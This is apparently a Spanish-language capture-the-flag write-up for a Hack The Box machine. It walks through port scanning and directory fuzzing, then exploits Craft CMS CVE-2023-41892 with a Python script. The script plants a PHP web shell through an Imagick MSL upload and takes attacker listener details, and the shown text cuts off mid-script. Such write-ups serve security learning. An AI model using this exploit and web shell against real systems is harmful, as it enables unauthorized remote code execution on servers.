<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.1" /><meta property="og:title" content="Surveillance Writeup" /><meta name="author" content="Miguel3023" /><meta property="og:locale" content="es_ES" /><meta name="description" content="Reconocimiento" /><meta property="og:description" content="Reconocimiento" /><link rel="canonical" href="/posts/Writeup-Surveillance/" /><meta property="og:url" content="/posts/Writeup-Surveillance/" /><meta property="og:site_name" content="Miguel3023" /><meta property="og:image" content="/assets/img/commons/Surveillance/Surveillance.png" /><meta property="og:image:height" content="300" /><meta property="og:image:width" content="300" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-12-16T00:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="/assets/img/commons/Surveillance/Surveillance.png" /><meta property="twitter:title" content="Surveillance Writeup" /><meta name="twitter:site" content="@AngelMiguel3023" /><meta name="twitter:creator" content="@AngelMiguel3023" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Miguel3023","url":"https://miguel3023.github.io"},"dateModified":"2023-12-17T23:30:25-05:00","datePublished":"2023-12-16T00:00:00-05:00","description":"Reconocimiento","headline":"Surveillance Writeup","image":{"width":300,"height":300,"url":"/assets/img/commons/Surveillance/Surveillance.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"/posts/Writeup-Surveillance/"},"url":"/posts/Writeup-Surveillance/"}</script><title>Surveillance Writeup | Miguel3023</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Miguel3023"><meta name="application-name" content="Miguel3023"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/sr.integra.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Miguel3023</a></div><div class="site-subtitle font-italic">CTF Player | Cybersecurity enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE MÍ</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/miguel3023" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/AngelMiguel3023" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://app.hackthebox.com/profile/907376" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/miguel-malag%C3%B3n-8547301b0/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Surveillance Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Surveillance Writeup</h1><div class="post-meta text-muted"> <span> Publicado <em class="" data-ts="1702702800" data-df="DD/MM/YYYY" data-toggle="tooltip" data-placement="bottom"> 16/12/2023 </em> </span> <span> Actualizado <em class="" data-ts="1702873825" data-df="DD/MM/YYYY" data-toggle="tooltip" data-placement="bottom"> 17/12/2023 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 300 300'%3E%3C/svg%3E" data-src="../../assets/img/commons/Surveillance/Surveillance.png" class="preview-img bg" alt="Preview Image" width="300" height="300" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> Por <em> <a href="https://miguel3023.github.io">Miguel3023</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2514 palabras"> <em>13 min</em> de lectura</span></div></div></div><div class="post-content"><h2 id="reconocimiento"><span class="mr-2">Reconocimiento</span><a href="#reconocimiento" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Inicialmente escaneo los puertos abiertos con Nmap, empleando ciertos parámetros para acelerar el escaneo ya que estamos en entornos totalmente controlados.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>❯ nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">--open</span> <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.245 <span class="nt">-oG</span> OpenPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-16 13:12 <span class="nt">-05</span>
Initiating SYN Stealth Scan at 13:12
Scanning 10.10.11.245 <span class="o">[</span>65535 ports]
Discovered open port 80/tcp on 10.10.11.245
Discovered open port 22/tcp on 10.10.11.245
Completed SYN Stealth Scan at 13:12, 22.92s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.11.245
Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 49379 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 16154 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>22.99 seconds
           Raw packets sent: 113878 <span class="o">(</span>5.011MB<span class="o">)</span> | Rcvd: 62549 <span class="o">(</span>2.502MB<span class="o">)</span>
</pre></table></code></div></div><p>Se aprecia el puerto 80 abierto corriendo “http” y el 22 corriendo “ssh”. Ya que hay una página a través de dicho puerto, con <strong>whatweb</strong> se veo las tecnologías que se emplean en la Web.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>❯ whatweb http://10.10.11.245
http://10.10.11.245 <span class="o">[</span>302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.11.245], RedirectLocation[http://surveillance.htb/], Title[302 Found], nginx[1.18.0]
ERROR Opening: http://surveillance.htb/ - no address <span class="k">for </span>surveillance.htb
</pre></table></code></div></div><p>Veo que hay un dominio de por medio y no carga la Web ya que el dominio hay que añadirlo al fichero <strong>/etc/hosts</strong> junto a la IP para que a nivel de DNS se resuelva dicho dominio a la IP.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.245 surveillance.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts

❯ catnp /etc/hosts

    <span class="c"># Host addresses</span>
    127.0.0.1  localhost
    127.0.1.1  parrot
    ::1        localhost ip6-localhost ip6-loopback
    ff02::1    ip6-allnodes
    ff02::2    ip6-allrouters
    <span class="c"># Others</span>
    <span class="c">#</span>
    10.10.11.245 surveillance.htb

</pre></table></code></div></div><p>Posteriormente se visualizo la Web para ver qué contiene</p><p><img data-src="/assets/img/commons/Surveillance/Web.png" alt="Web" class="center-image" data-proofer-ignore> <em>Visualizando la Web</em></p><p>Luego con <strong>Nmap</strong> se hago un escaneo a los puertos específicos encontrados previamente, especificando parámetros para ver la versión de los servicios (HTTP y SSH) que están bajo esos puertos</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.245 <span class="nt">-oN</span> services
Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-16 13:37 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>surveillance.htb <span class="o">(</span>10.10.11.245<span class="o">)</span>
Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title:  Surveillance
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>22.24 seconds
</pre></table></code></div></div><p>Hago un fuzzeo con <strong>wfuzz</strong> a la Web y descubro una ruta <strong>/admin</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://surveillance.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://surveillance.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000015:   200        1 L      0 W        1 Ch        "index"
000000007:   200        475 L    1185 W     16228 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0
                                                        /"
000000001:   200        475 L    1185 W     16228 Ch    "# directory-list-2.3-medium.txt"
000000003:   200        475 L    1185 W     16228 Ch    "# Copyright 2007 James Fisher"
000000039:   301        7 L      12 W       178 Ch      "img"
000000016:   301        7 L      12 W       178 Ch      "images"
000000014:   200        475 L    1185 W     16228 Ch    "http://surveillance.htb/"
000000259:   302        0 L      0 W        0 Ch        "admin"
</span></pre></table></code></div></div><p>Luego voy a la Web a ver qué contiene esta ruta y me redirige a <strong>/admin/login</strong>. Veo que tiene un gestor de contenidos (CMS) llamado Craft</p><p><img data-src="/assets/img/commons/Surveillance/cms.png" alt="Web" class="center-image" data-proofer-ignore> <em>Craft CMS Login</em></p><p>Luego buscando “Craft CMS vulnerabilities” y en el primer resultado de la búsqueda, veo que está el <strong>CVE-2023-41892</strong> con un <strong>CVSS</strong> crítico</p><p><img data-src="/assets/img/commons/Surveillance/cve.png" alt="Web" class="center-image" data-proofer-ignore> <em>Craft CMS CVE</em></p><h2 id="explotación"><span class="mr-2">Explotación</span><a href="#explotación" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Luego buscando por el CVE correspondiente encontré un <a href="https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce">POC</a> el cual contiene un script en Python para la explotación de la vulnerabilidad, sin embargo, yo realicé algunas modificaciones escribiendolo desde cero para comprender todo lo que pasa por detrás.</p><p>Pero antes de continuar con el script, voy a explicar la manera de como entendí cómo sucede todo por detrás, porque soy un curioso y la curiosidad mato al …</p><p>Primeramente, dentro del POC hay un <a href="https://blog.calif.io/p/craftcms-rce">link</a> donde se nos explica la vulnerabilidad un poco más en detalle. Para resumir todo, básicamente lo que se hace por detrás es que se puede crear un <strong>Objeto</strong> gracias a los distintos métodos que hay corriendo. Dentro de esos métodos hay uno el cual es <strong>\yii\rbac\PhpManager::loadFromFile</strong> que lo que hace es cargar datos desde un archivo, el archivo que indicaremos en el script.</p><p>Luego tenemos en el código base de <strong>Craft CMS</strong> una clase <strong>\GuzzleHttp\Psr7\FnStream</strong> que lo que hace es destruir el objeto y hace una limpieza en la memoria, esto nos sirve para poder cargar el <strong>phpinfo</strong> al realizar una nueva instancia de dicha clase.</p><p>Una vez entendido esto y que podemos crear objetos a nuestro gusto, está la ocurrencia en la extensión <strong>Imagick</strong>, la cual posteriormente será un objeto. En este <a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">link</a> se nos explica cómo funciona todo.</p><p>Ahora abusaremos de la extensión <strong>Imagick</strong> de PHP, donde dicha extensión acepta como parámetro <strong>files</strong> y a este parámetro se le podrán pasar rutas de alguna imágen, una url, o incluso wildcards. (Véase <a href="https://www.php.net/manual/es/imagick.construct.php">Imagick Constructor</a>).</p><p><strong>Imagick</strong> admite el formato MSL, a través y gracias a dicho formato es que lograremos explotar la vulnerabilidad. A través de este formato seremos capaces de leer o mejor dicho, php será capaz de interpretar un archivo MSL en una ruta donde se le indique.</p><p>Una vez comprendido esto, lo que haremos será crear el archivo MSL con formato XML ya que así viene el formato MSL y a través del esquema VID de <strong>Imagick</strong> y con wildcards podemos llegar a saber el nombre del archivo el cual se sube en la máquina víctima, ya que el archivo se sube en la ruta temporal por defecto gracias a que generamos un error por HTTP, solamente que dicho archivo tendrá un nombre que inicia por <strong>php</strong> y lo que le siga de manera aleatoria. A través del esquema VID lo que se conseguirá no es sólo el nombre del archivo sino que también jugando junto a <strong>MSL</strong> podremos hacer que se ejecute el archivo subido. Una vez entendido todo (O espero que así haya sido) podemos ver el scritp.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">re</span>


<span class="k">def</span> <span class="nf">leaving</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>

    <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo...</span><span class="se">\n</span><span class="s">"</span><span class="p">))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">leaving</span><span class="p">)</span>

<span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span><span class="s">'http'</span><span class="p">:</span><span class="s">'http://127.0.0.1:8080'</span><span class="p">}</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">get_target</span><span class="p">():</span>

    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">"Exploit for CVE-2023-41892"</span><span class="p">)</span>

    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-t"</span><span class="p">,</span> <span class="s">"--target"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"target"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"exploit.py -t &lt;ip target or domain&gt;"</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-l"</span><span class="p">,</span> <span class="s">"--listen"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"listen"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"exploit.py -t -i &lt;your attacker ip&gt;"</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-p"</span><span class="p">,</span> <span class="s">"--port"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"port"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"exploit.py -t -i &lt;your attacker port of listening&gt;"</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">listen</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span>


<span class="k">def</span> <span class="nf">get_route_web</span><span class="p">():</span> <span class="c1">#Obtenemos la ruta donde se almacena la página web
</span>

    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"action"</span><span class="p">:</span> <span class="s">"conditions/render"</span><span class="p">,</span>
            <span class="s">"testConfigObject"</span><span class="p">:</span><span class="s">"craft\elements\conditions\ElementCondition"</span><span class="p">,</span>
            <span class="s">"config"</span><span class="p">:</span> <span class="sa">r</span><span class="s">'{"name":"testConfigObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'</span> <span class="p">}</span>



    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>


    <span class="n">route_web</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'DOCUMENT_ROOT\'\]&lt;\/td&gt;&lt;td class="v"&gt;([^&lt;]+)&lt;\/td&gt;&lt;/tr&gt;'</span>

    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">route_web</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">match</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">write_payload</span><span class="p">(</span><span class="n">web_route</span><span class="p">):</span> <span class="c1">#Enviamos un archivo en formato MSL cuya estructura será una imágen y en XML, antes de realizar el envío cargamos a través de la extensión Imagick y con formato MSL el /etc/hosts para que la solicitud HTTP falle, lo que hará que el archivo que enviamos se cargue en la ruta /tmp
</span>
    <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] Enviando archivo de imagen..."</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>

    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"action"</span><span class="p">:</span> <span class="s">"conditions/render"</span><span class="p">,</span>
            <span class="s">"testConfigObject"</span><span class="p">:</span><span class="s">"craft\elements\conditions\ElementCondition"</span><span class="p">,</span>
            <span class="s">"config"</span><span class="p">:</span> <span class="sa">r</span><span class="s">'{"name":"testConfigObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/hosts"}}}'</span>      <span class="p">}</span>

    <span class="n">image_file</span> <span class="o">=</span> <span class="p">{</span>

        <span class="s">"image"</span><span class="p">:</span> <span class="p">(</span><span class="s">"pwned.msl"</span><span class="p">,</span> <span class="sa">f</span><span class="s">"""&lt;?xml version="1.0" encoding="UTF8"?&gt;
        &lt;image&gt;
        &lt;read filename="caption:&amp;lt;?php @system(@$_REQUEST['ts']); ?&amp;gt;"/&gt;
        &lt;write filename="info:</span><span class="si">{</span><span class="n">web_route</span><span class="si">}</span><span class="s">/cpresources/ts.php"/&gt;
        &lt;/image&gt;"""</span><span class="p">,</span> <span class="s">"text/plain"</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">image_file</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">execute_msl</span><span class="p">():</span> <span class="c1">#Ejecutamos a través del esquema vid y formato msl para buscar el nombre del archivo mediante wildcards y con la extensión imagick
</span>
    <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] Obteniendo nombre del archivo...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>

    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"action"</span><span class="p">:</span> <span class="s">"conditions/render"</span><span class="p">,</span>
        <span class="s">"configObject[class]"</span><span class="p">:</span> <span class="s">"craft\elements\conditions\ElementCondition"</span><span class="p">,</span>
